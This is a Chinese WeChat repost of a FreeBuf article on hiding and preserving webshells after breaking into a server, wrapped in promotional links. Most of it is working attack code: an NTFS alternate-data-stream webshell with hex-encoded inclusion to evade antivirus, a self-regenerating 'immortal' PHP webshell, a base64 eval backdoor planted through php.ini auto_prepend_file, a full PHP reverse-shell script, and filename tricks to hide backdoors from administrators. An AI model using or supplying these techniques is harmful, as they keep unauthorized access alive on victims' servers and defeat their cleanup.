<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/uRGrORtJtbV83xi1NOkceg)

**基础学渗透，领取配套视频**

**#统统可白嫖#**

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHyfzIicIMsib97kZfZEART3awLIBLCUTufSibfC1DXZotKfSvNs2Zr0MSUr7dEWIwsQiay1jwn5WXaOA/640?wx_fmt=png)

扫码找小助理白嫖渗透资料![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSEEQwsVFyfJD70E9HmDELbPwumVMkXxnmgmwHklA5JxIWJlzcPao47a9cibAmp1zeZ5Hf8yEWZSFBg/640?wx_fmt=png)

**学习大佬的思路技巧**  

  

  

一、简介：

**作者：**萨满原子 12  

原文地址：https://www.freebuf.com/articles/web/248569.html
-----------------------------------------------------

**辛辛苦苦拿下的 shell，几天没看，管理员给删了。****其实****隐藏的技巧也有很多**
-------------------------------------------------

**1.attrib +s +h**
------------------

一创建系统隐藏文件：

attrib +s +a +r +h

attrib +s +h 文件名

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSE6XDKiaNlic0lCrd6Rr0miaKWn9nx37mTA6FZiah6PiaycPIaeYu4mWbU4qIUTqZvf9MqtE3wh84ekGWw/640?wx_fmt=png)

在 Windows 10 下即使开启了显示隐藏的项目，或 dir 仍然看不见。  

**2. 利用 ADS 隐藏文件**
------------------

NTFS 交换数据流（Alternate　Data　Streams，简称 ADS）是 NTFS 磁盘格式的一个特性，在 NTFS 文件系统下，每个文件都可以存在多个数据流。

通俗的理解，就是其它文件可以 “寄宿” 在某个文件身上，而在资源管理器中却只能看到宿主文件，找不到寄宿文件。利用 ADS 数据流，我们可以做很多有趣的事情。(抄的)

首先创建 ADS 隐藏文件

在命令行，echo 一个数据流进去，比如 index 文件是正常文件。

echo ^<?php @eval($_REQUEST[1]);?^> > index.php:shell.jpg

这样就生成了一个不可见的 index.php:shell.jpg

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSE6XDKiaNlic0lCrd6Rr0miaKWvvn26Ticyvyt1V8ktbDQhW5uLMpSzV24ulJ7QFlUB9EXmJJhJ8QhYqw/640?wx_fmt=png)

使用 dir /r 查看  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSE6XDKiaNlic0lCrd6Rr0miaKWgmxqdwTkfKf3O2wOf8zkfpalbYnyAk5NXk4oQsqtBvj6WGQmYHPypQ/640?wx_fmt=png)

可使用命令直接修改，要删除的话 直接删除 index.php 就 ok 了  

第二步，直接使用正常文件包含。

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSE6XDKiaNlic0lCrd6Rr0miaKWcq4klWDh35pxOKkwRUo6BOccQq1g9VA2ThrO9T5eZk7TDyWBTd2UzQ/640?wx_fmt=png)

> 做一些免杀  
> 把 index.php:shell.jpg hex 编码
> 
> <?php
> 
> $a="696E6465782E7068703A7368656C6C2E6A7067";
> 
> // index.php:shell.jpg hex 编码
> 
> $b="a";
> 
> include(PACK('H*',$$b))
> 
> ?>

**3.php 环境变量留 shell**
---------------------

在 c 盘创建这个目录

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSE6XDKiaNlic0lCrd6Rr0miaKWRQLncnEYOmXgeb3SS7LOabusYFGQEeuykN6WlYfqvOxymzFib0Bterw/640?wx_fmt=png)

丢个图片一句话  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSE6XDKiaNlic0lCrd6Rr0miaKWd7ebiajibAd7bjmoob2MfH8aqM4BoLOicIyniawNicKxdFKVuz2XlSwHy5w/640?wx_fmt=png)

然后文件包含，就好。为了隐蔽可以包含图片马，txt 等。  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSE6XDKiaNlic0lCrd6Rr0miaKW7mEuLJ1JzQTpq92hYkZ3VrHJWEou72hbY445DTJibZpCOnY8KwVL1jA/640?wx_fmt=png)

**4. 不死马**
----------

运行后，会删除自身，生成一个 webshell.php，管理员删除后还会生成。

> <?php
> 
> set_time_limit(0);
> 
> ignore_user_abort(1);
> 
> unlink(__FILE__);
> 
> while(1){
> 
> file_put_contents('webshell.php','<?php @eval($_POST["password"]);?>');
> 
> sleep(5);
> 
> }

解决覆盖重写或者重启 web 服务删掉即可。

> <?php
> 
> set_time_limit(0);
> 
> ignore_user_abort(1);
> 
> unlink(__FILE__);
> 
> while(1){
> 
> file_put_contents('webshell.php','clear');
> 
> sleep(1);
> 
> }

**5. php.ini 后门**
-----------------

将下面后门写入 php.ini

> allow_url_include=On
> 
> auto_prepend_file="data:;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW2NtZF0pOz8+"
> 
> // base64 <?php @eval($_REQUEST[cmd]);?>
> 
> // 后门类型可自己修改。

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSE6XDKiaNlic0lCrd6Rr0miaKWFMLianVoAEEqZzNSoNGNmrHTNa3MHQHGuD8ELicYxBiaaNAqRawpERXRA/640?wx_fmt=png)

这些做好后，重启 web 服务就好了。  

方法 1. 如果权限很大的话，自己手动重启，缺点容易暴露，重启服务，就要上服务器，某里的服务器，异地登陆有短信提醒。

方法 2. 就是加载一个 php_socke.php 脚本，让他重新加载 php.ini

此后门，任何 php 都可菜刀连接

> <?php
> 
> /******************************/
> 
> /*     只适用于 windows 系统     */
> 
> /******************************/
> 
> while(true){// 别问我为什么要死循环，我也不清楚，只有设置成死循环才能加载新的 php.ini ...
> 
> @set_time_limit(0);
> 
> $system=strtoupper(substr(PHP_OS,0,3));
> 
> if(!extension_loaded('sockets'))
> 
> {
> 
> if($system=='WIN'){@dl('php_sockets.dll')ordie("Can't load socket");}
> 
> }
> 
> $host='255.255.255.255';//   搞一个不存在的 ip，万一给人家反弹过去了岂不是真尴尬了~~~
> 
> $port=1998;// 别问我为什么是 1998，问了我也不会告诉你....
> 
> if($system=="WIN"){$env=array('path'=>'c:\\windows\\system32');}
> 
> $descriptorspec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"),);
> 
> $host=gethostbyname($host);
> 
> $proto=getprotobyname("tcp");
> 
> if(($sock=socket_create(AF_INET,SOCK_STREAM,$proto))<0){die("Socket 创建失败");}
> 
> if(($ret=@socket_connect($sock,$host,$port))<0){die("连接失败");}
> 
> else{
> 
> $message="PHP 反弹连接 \ n";
> 
> @socket_write($sock,$message,strlen($message));
> 
> $cwd=str_replace('\\','/',dirname(__FILE__));
> 
> while($cmd=@socket_read($sock,65535,$proto))
> 
> {
> 
> if(trim(strtolower($cmd))=="exit"){
> 
> socket_write($sock,"Bye\n");exit;
> 
> }else{
> 
> $process=proc_open($cmd,$descriptorspec,$pipes,$cwd,$env);
> 
> if(is_resource($process)){
> 
> fwrite($pipes[0],$cmd);
> 
> fclose($pipes[0]);
> 
> $msg=stream_get_contents($pipes[1]);
> 
> socket_write($sock,$msg,strlen($msg));
> 
> fclose($pipes[1]);
> 
> $msg=stream_get_contents($pipes[2]);
> 
> socket_write($sock,$msg,strlen($msg));
> 
> $return_value=proc_close($process);
> 
> }
> 
> }
> 
> }
> 
> }
> 
> }
> 
> ?>
> 
> // 此脚本非百分百成功

**6.  关键字拆分，多文件包含！**
--------------------

比如一句话：@eval($_POST['x']); 我们可以写成 $a=$_POST['x'];@eval($a);

我们可以将 $a=$_POST['x']; 写入一个文件 POST.php

然后在 @eval($a); 一句话的上方使用 include "POST.php"；的方式引用！

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSE6XDKiaNlic0lCrd6Rr0miaKWkiaE5Quy3yic5h9n2d2eWsfXNtH4iaNIKFrg2PBIKnX5UerAUmDee1Z2w/640?wx_fmt=png)

**7. 将真正的一句话写入数据库**  

----------------------

当我们发现源码有个地方执行了数据库操作，那我们就可以改源码和数据库啦~

比如，修改成 eval(查出的数据);

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSE6XDKiaNlic0lCrd6Rr0miaKWqogvUOCnDuEm3OhiczXExDH7pWec5oZb7OTsDcl6EkJahU4bpLebr0A/640?wx_fmt=png)

**8. 以下是 linux 的**  

---------------------

无意中发现的。具体看代码。

```
<?php
$webpath = dirname(__FILE__)."/";
file_put_contents($webpath ."guige.jpg".chr(9).".php","保存的内容(比如写
个一句话)");
?>
```

生成一个文件。

在目录下看到是显示 名字为 guige.jpg

但是 web 浏览 却发现 没有找到 guige.jpg  后来发现 需要添 guige.jpg%09.php  

这样的话就导致我们可以对后门隐藏了。。管理员看到的是. jpg 我们却可以 web 用. php 解析来

连接。。。有用的到的可以看看。

声明：本公众号所分享内容仅用于网安爱好者之间的技术讨论，禁止用于违法途径，**所有渗透都需获取授权**！否则需自行承担，本公众号及原作者不承担相应的后果.

@

**欢迎关注视频号：“****掌控安全课堂****”**

**分享点那些黑客你不知道的事，每周二也会开直播唠唠嗑！**

**解决大家在自学上存在的烦恼！**

 ![](http://wx.qlogo.cn/finderhead/Q3auHgzwzM5GasbBjHczHC7IgL2AAuVMBjlg8WPebhsOVribyZXibibTQ/0) **掌控安全课堂** ， 特斯拉怒了！找出 bug 送一辆车！# 特斯拉 #网络安全# 黑客 #信息安全 视频号

[

爬取免费代理，拥有自己的代理池

2021-10-22

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSHaWlec76UcVgaVkib8uTLrZ9yNSDKjklBxYP3oCBQMUxxcf35EBIf6dibNWuDxbTb2RYUyWjKupLXw/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247538507&idx=1&sn=012e95638679390d727ad9ac76f8093a&chksm=ebea1e66dc9d977076c87f955d303509c6a5dee9f498e18669ed25463d9403d7bd7fa2935277&scene=21#wechat_redirect)

[

Burpsuite 在各场景下的抓包方法 (整理)

2021-08-11

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGxyQDNlLJqgCtl0uVbspVnw7mIx6WzWt0EyBfIZ4TEg0xoVhnq0aQ1C3LAwTjqkkBBQVuGCVmbbQ/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247530928&idx=1&sn=46ce72097822348cd6d17e2941e60db6&chksm=ebea309ddc9db98bece713fa8eec5b2c9f47cdfb5921c976319c555d627dcd3ec2dc1dee58b6&scene=21#wechat_redirect)

[

【精选】SRC 快速入门 + 上分小秘籍 + 实战指南

2021-07-26

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSG4hnDrcfyBr4yp6gXLibsXuBFUwfZlEFxK6tMHyUPcQlkWKhoafcKcoh8X6nw6O359kfhkHDYoLmg/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247528604&idx=1&sn=5ab3a5b3eaf0c56fcdeabccadfdc6bde&chksm=ebea39b1dc9db0a71fa71d233709afdfd2e2e0483ded28cca42044eded300f1c7025bde1b37a&scene=21#wechat_redirect)

[

干货｜列了几种均能过安全狗的方法！

2021-07-01

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSG24NfnFAyvceedkicO9fPkUwQ9X1L8owPwAichgQibfKV9RPxFibr8ia1JmdjjyFSGlUu97qfecE9iczCQ/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247524943&idx=1&sn=98644144a3c10bb068ec0f310dcc4958&chksm=ebea2b62dc9da2749321fce7ab28788ced08a2b496e0a45b06a5887b5aa457e48f7a66110301&scene=21#wechat_redirect)

[

巧用 FOFA 挖到你的第一个漏洞

2021-06-08

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSEJumG6X6C1M75AVwnphgU4wO2tIdSFib6hV6m4GLica2XGIEP1ujeNm1WVia1S6wFOV4RBB13FoxXIw/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247521952&idx=1&sn=55ab0613e5a7ba79b78849b4d91451f6&chksm=ebeadf8ddc9d569bcc64e99414dcbe6878a0b2c9f5c057b30c4bbe465ba76fcaa64e66caa0c2&scene=21#wechat_redirect)

[

一名大学生的黑客成长史到入狱的自述

2020-12-22

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGzeY0rLibT3cqh51icktS1tKjpxm4A8ib17UC35kYoXLiak8X7Ugtu2rW2BRth3X5vKickew16jMibak2A/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247502926&idx=1&sn=8750295399cdcc5e71918c30bb1a974f&chksm=ebea8563dc9d0c75cdf709d2d16fdbdf82abee64516f7a44347f40056969d1b4bc3a1eb2ab2e&scene=21#wechat_redirect)

[

那些年的 Hvv 日记

2021-04-17

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSFRZS6XmvwR7KNeLGxuk6C4NDAawNMNvfHW7iacLEa7nYTUTCDQrfQcvRdfShEKtv7W9DWSufrYKlQ/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247515246&idx=1&sn=b1a73a93f8ce9a5d51ce3bed4ada1e56&chksm=ebeaf543dc9d7c557c36881cccaaffad5312938ad0450dc1e4050de583523c2a27ba5ab3a469&scene=21#wechat_redirect)

**看到这里了，点个 “赞”、“再看” 吧**